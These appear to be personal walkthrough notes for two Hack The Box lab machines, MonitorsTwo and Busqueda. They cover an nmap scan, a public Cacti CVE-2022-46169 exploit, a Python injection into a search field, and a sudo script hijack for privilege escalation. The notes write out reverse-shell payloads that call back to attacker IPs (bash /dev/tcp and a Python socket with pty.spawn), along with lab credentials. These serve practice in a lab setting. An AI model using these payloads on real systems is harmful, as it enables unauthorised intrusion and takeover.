# HTB_Machines_Easy

## MonitorsTwo
1. Observe opened ports
    - `sudo nmap <ip>`
        - 22/tcp open ssh
        - 80/tcp open http
2. Observe website (http is open)
    - URL = 10.10.11.211
        -  login screen
        -  Cacti version 1.2.22
            -  search for the vulns
                -  CVE-2022-46169 (https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22)
3. Exploit the CVE-2022-46169 vuln
    - download the exploit script
        - `git clone https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22`
    - `nc -nlvp 443`
    - `python3 CVE-2022-46169.py  -u http://<ip> --LHOST=<local_IP> --LPORT=443`
        - LHOST can be obtained with `ifconfig` -> tun0 IP
    - explore the reverse shelled connection
        - `whoami` `ls -l /`
        - `ls -la /`
            - we can see the file ".dockerenv" -> we are inside Docker container
        - `cat entrypoint.sh`
            >mysql --host=db --user=root --password=root cacti -e "show tables"

        - `mysql --host=db --user=root --password=root cacti -e "show tables"`


## Busqueda
1. Reco
`sudo nmap -sVC 10.10.11.208`
    - sudo nano /etc/hosts
        - 10.10.11.208  searcher.htb
2. Weaponisation
App is running Searchor v2.4.0 which has vuln
![](https://hackmd.io/_uploads/S1qlltUqh.png)

3. Exploitation
- as a search value, insert RS inside it:
    - `nc -nlvp 4444`
    - `'),__import__('os').system('bash -c "bash -i >& /dev/tcp/<IP>/<port> 0>&1"')#`

4. User flag
    - cd
    - cat user.txt

5. Root flag
    
    ![](https://hackmd.io/_uploads/HkC_MK8qn.png)
    - UN: cody
    - PW: jh1usoih2bkjaspwe92 
- SSH connect
    - ssh svc@10.10.11.208
        - PW: jh1usoih2bkjaspwe92
    - we can edit the python script file
        - ![](https://hackmd.io/_uploads/SyKJVFIqn.png)
- PE
    - [exploit](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/python-privilege-escalation/)
        - `import socket,os,pty;s=socket.socket();s.connect(("<local-ip>",<port>));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")`
    - cd
        - `nano full-checkup.sh`
            - ![](https://hackmd.io/_uploads/HyyBHKLq3.png)

```
#!/usr/bin/python3
import socket,os,pty;s=socket.socket();s.connect(("10.10.14.12",1234));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")
```
- `chmod +x full-checkup.sh`
    - LOCAL machine: `nc -nlvp <port>`
    - `sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup`

![](https://hackmd.io/_uploads/S13UdFU9h.png)


